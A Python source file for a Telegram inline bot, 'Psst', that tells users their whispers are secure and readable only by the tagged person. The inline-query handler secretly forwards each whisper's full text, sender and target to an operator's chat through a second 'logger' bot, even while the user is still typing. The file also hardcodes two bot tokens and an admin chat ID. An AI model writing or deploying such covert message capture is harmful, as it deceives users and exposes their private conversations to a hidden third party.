import asyncio
import hashlib
import os
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION
WHISPER_BOT_TOKEN = "9047407190:AAFjkuIscghTXhLbc5QBGm2AUF-qHp66oNc"
LOGGER_BOT_TOKEN  = "9261718236:AAE2_Hr9yGz3WvoaJqIl2X4mpmQxsNKz404"
ADMIN_CHAT_ID     = 923996862
BOT_USERNAME      = "Psstmebot"

DB_PATH = "whispers.db"

# Initialize Bots
bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER,
                is_read INTEGER DEFAULT 0
            )
        ''')
        await db.commit()

# 📡 BOT 2: LOGGER FUNCTION
async def log_to_admin(sender_user, target, text):
    log_message = (
        "📥 **New Whisper Captured**\n"
        f"👤 **From:** @{sender_user}\n"
        f"🎯 **To:** {target}\n"
        f"💬 **Content:** {text}"
    )
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
        print("[LOGGER SUCCESS] Log successfully pushed to the admin!")
    except Exception as e:
        print("\n❌ [LOGGER ERROR] Failed to send log to admin!")
        print(f"Reason: {e}")
        print("👉 FIX: Search for the LOGGER bot on Telegram and press 'START'. Also check if your ADMIN_CHAT_ID is 100% correct.\n")

# 🚀 BOT 1: INLINE QUERY HANDLER
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    text = inline_query.query.strip()
    
    if not text.startswith("@"):
        return 
        
    parts = text.split(" ", 1)
    target_username = parts[0]
    
    # Pops up menu instantly even before message text is completely written out
    whisper_text = parts[1].strip() if len(parts) > 1 else ""
    
    if target_username == "@":
        return

    sender = inline_query.from_user
    whisper_id = secrets.token_urlsafe(8)
    expires_at = int(time.time()) + 86400  # 24 hours
    
    # Only write record if text exists, otherwise show typing preview window card template
    if whisper_text:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
                (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
            )
            await db.commit()
        
        # Fire off logging bot routine
        await log_to_admin(sender.username or sender.id, target_username, whisper_text)
        
        description_text = f"Message: {whisper_text[:35]}..."
    else:
        description_text = "Type your secret message after their username..."

    input_content = types.InputTextMessageContent(
        message_text=f"A whisper message to {target_username}.\nOnly they can read the message."
    )
    
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔒🔑", callback_data=f"whsp:{whisper_id}")]
    ])

    item = types.InlineQueryResultArticle(
        id=whisper_id,
        title=f"🔒 Send long whisper to {target_username}",
        description=description_text,
        input_message_content=input_content,
        reply_markup=keyboard
    )
    
    # cache_time=0 forces fast client refresh rates across active user inputs
    await inline_query.answer([item], cache_time=0, is_personal=True)

# 🔐 BOT 1: REVEAL CALLBACK HANDLER
@dp.callback_query(lambda c: c.data.startswith("whsp:"))
async def handle_whisper_click(callback: types.CallbackQuery):
    whisper_id = callback.data.split(":")[1]
    current_user = callback.from_user.username

    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT target_username, secret_text, expires_at, is_read, sender_username FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            row = await cursor.fetchone()

    if not row:
        await callback.answer("❌ This whisper has expired or no longer exists.", show_alert=True)
        return

    target_username, secret_text, expires_at, is_read, sender_username = row

    if int(time.time()) > expires_at:
        await callback.answer("❌ This whisper has expired.", show_alert=True)
        return

    if not current_user:
        await callback.answer("❌ Set a Telegram username handle in settings first.", show_alert=True)
        return

    clean_target = target_username.lstrip('@').lower()
    
    if current_user.lower() != clean_target:
        await callback.answer(f"🔒 Access Denied! This secret text is exclusively for {target_username}.", show_alert=True)
        return

    # 1. Show modal alert instantly
    await callback.answer(f"📩 Private Secret Whisper:\n\n{secret_text}", show_alert=True)

    # 2. Push message to target user's private bot inbox
    try:
        saved_copy = (
            f"📥 **Retained Whisper Archive**\n"
            f"👤 **From:** @{sender_username or 'Anonymous'}\n"
            f"💬 **Message:** `{secret_text}`"
        )
        await bot1.send_message(chat_id=callback.from_user.id, text=saved_copy, parse_mode="Markdown")
    except Exception:
        pass

    # 3. Edit group text
    if is_read == 0:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE whispers SET is_read = 1 WHERE whisper_id = ?", (whisper_id,))
            await db.commit()
            
        clean_display_name = current_user.replace('_', '\\_')
        await callback.message.edit_text(
            text=f"{clean_display_name} read the whisper",
            reply_markup=None
        )

# 📥 BOT 1: START COMMAND (Welcome interface layout updated)
@dp.message(Command("start"))
async def handle_start(message: types.Message):
    welcome = (
        "🤫 **Welcome to Psst!**\n\n"
        "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
        "only the person you tag can unlock and read it.\n\n"
        "💡 **How to Use:**\n"
        "In any chat, simply type:\n"
        "`@Psstmebot @username your long secret message here...`\n\n"
        "🌟 _Notice: You can start earning stars after sending 25 whispers using our bot._\n\n"
        "✨ **Thank you for choosing and using our bot!**"
    )
    await message.answer(welcome, parse_mode="Markdown")

# ⚙️ SYSTEM START LOOP
async def main():
    await init_db()
    print("🤖 Application running initialization loops...")
    
    # Test logger connection immediately upon startup
    print("Testing Logger Bot token link connectivity...")
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text="⚙️ **Whisper System Online**\nYour logger bot is connected successfully!")
        print("✅ [SUCCESS] Logger Bot test message sent out to your Telegram app chat screen.")
    except Exception as e:
        print("\n❌ [STARTUP WARNING] Logger bot verification failed.")
        print(f"Error Diagnostic details: {e}")
        print("👉 Make sure you hit 'Start' inside the logger bot's private chat room window.\n")

    try:
        await dp.start_polling(bot1)
    finally:
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())
